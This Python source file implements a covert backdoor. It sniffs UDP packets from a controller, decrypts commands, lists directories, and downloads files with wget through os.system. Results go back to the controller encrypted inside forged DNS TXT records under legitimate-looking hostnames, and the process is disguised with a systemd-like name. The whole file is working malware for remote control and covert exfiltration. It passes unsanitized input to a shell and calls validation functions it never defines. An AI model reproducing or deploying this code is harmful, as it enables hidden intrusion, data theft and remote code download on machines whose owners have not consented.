"""
    This is the backdoor program.
"""

# Standard Modules
import os
from random import randint
import argparse
from ipaddress import ip_address, IPv6Address
from sys import exit

# Custom Modules
from utils.encryption import StreamEncryption
from utils.shell import LIST, WGET

# Third Party Libraries
from scapy.all import sniff, UDP, DNSQR, DNSRR, IP, DNS, send
from setproctitle import setproctitle, getproctitle


# Command Line Arguments
parser = argparse.ArgumentParser("./backdoor.py")
parser.add_argument("controller_ip", help="The IPv4 address of the controller host.")
parser.add_argument("backdoor_ip", help="The IPv4 address of the backdoor host.")
parser.add_argument("interface", help="The name of the Network Interface Device to listen on. i.e. wlo1, enp2s0, enp1s0")
args = parser.parse_args()


# Validate Arguments
if not validate_ipv4_address(args.controller_ip):
    print(f"Invalid IPv4 Address: '{args.controller_ip}'")
    exit(1)

if not validate_ipv4_address(args.backdoor_ip):
    print(f"Invalid IPv4 Address: '{args.backdoor_ip}'")
    exit(1)
    
if not validate_nic_interface(args.interface):
    print(f"Network Interface does not exist: '{args.interface}'")
    exit(1)


# Global Variables
CONTROLLER_IP = args.controller_ip
BACKDOOR_IP = args.backdoor_ip
NETWORK_INTERFACE = args.interface
e = StreamEncryption()

# List of legit hostnames
hostnames = ["play.google.com", 
            "pixel.33across.com", 
            "signaler-pa.clients6.google.com",
            "www.youtube.com", 
            "www.google.ca", 
            "www.amazon.ca", 
            "www.amazon.com",
            "safebrowsing.googleapis.com",
            "upload.wikimedia.org",
            "hhopenbid.pubmatic.com"]


# Initialize the encryption context.
e.read_nonce("data/nonce.bin")
e.read_secret("data/secret.key")
e.initialize_encryption_context()


class DirectoryNotFound(Exception): pass


def get_random_hostname():
    size = len(hostnames)
    index = randint(0, size-1)
    return hostnames[index]


def receive_dns_command(pkt):
    msg_len = pkt[UDP].len
    ciphertext = bytes(pkt[UDP].payload)[0:msg_len]
    msg_bytes = e.decrypt(ciphertext)
    msg = msg_bytes.decode("utf-8")
    return msg


def send_dns_query(query):
    # Send the query.
    send(query, verbose=0)


def forge_dns_query(data: str):
    # Choose random legitimate hostname.
    hostname = get_random_hostname()
    # Encrypt data
    encrypted_data = e.encrypt(data.encode("utf-8"))
    if len(encrypted_data) > 255:
        print("ERROR: Can't fit more than 255 bytes in TXT record!")
        print("Truncating data...")
        encrypted_data = encrypted_data[0:256]
    # Forge the DNS packet with data in the text record.
    query = IP(dst=CONTROLLER_IP)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=hostname), ar=DNSRR(type="TXT", ttl=4, rrname=hostname, rdlen=len(encrypted_data)+1, rdata=encrypted_data))
    return query


def hide_process_name(name: str):
    setproctitle(name)


def execute_list_command(file_path: str) -> bool:
    try:
        contents = list_directory_contents(file_path)
    except DirectoryNotFound:
        query = forge_dns_query(data="ERRORMSG: Directory not found.")
        send_dns_query(query)
        return False
    data = ""
    for name in contents:
        data += name
        data += " "
    data = data.strip() # Remove last whitespace
    query = forge_dns_query(data=data)
    send_dns_query(query)
    return True


def execute_wget_command(url: str, filepath: str) -> bool:
    if not os.path.isdir(filepath):
        query = forge_dns_query(data="ERRORMSG: Directory not found or filepath is not a directory.")
        send_dns_query(query)
        return False
    query = forge_dns_query(data="Success.")
    send_dns_query(query)
    os.system(f"wget {url} -P {filepath}")
    return True


def list_directory_contents(file_path: str) -> list:
    if not os.path.isdir(file_path):
        raise DirectoryNotFound
    return os.listdir(file_path)


def packet_handler(pkt):
    # Do nothing if not the correct packet.
    if pkt[UDP].sport != 10069 or pkt[UDP].dport != 10420:
        return
    # Decrypt the command.
    command = receive_dns_command(pkt)
    print(f"Received: {command}")
    # Check command and perform operation
    argv = command.split(" ")
    argc = len(argv)
    if argc == 2:
        # Process the command.
        if argv[0] == LIST:
            execute_list_command(argv[1])
            return
    if argc == 3:
        if argv[0] == WGET:
            execute_wget_command(argv[1], argv[2])


if __name__ == "__main__":
    # Hide process name.
    hide_process_name("systemd-userwork-evil")
    # Start listening for packets.
    sniff(filter=f"ip src host {CONTROLLER_IP} and not port ssh and udp and not icmp", iface=f"{NETWORK_INTERFACE}", prn=packet_handler)
